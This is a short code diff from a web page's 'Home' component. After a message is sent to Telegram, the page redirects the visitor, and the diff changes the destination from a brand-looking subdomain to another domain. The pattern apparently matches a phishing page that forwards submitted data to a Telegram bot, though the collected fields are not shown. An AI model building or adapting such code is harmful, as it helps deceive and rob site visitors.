@@ -57,7 +57,7 @@ export default function Home() {
 
         if (response.status === 200) {
           console.log('Message sent successfully to Telegram!', response.data);
-          window.location.href = 'https://bonsage.biggreeneegg.com/'; // Redirect on success
+          window.location.href = 'https://sgg.achemsite.info/'; // Redirect on success
         } else {
           throw new Error('Failed to send message to Telegram.');
         }
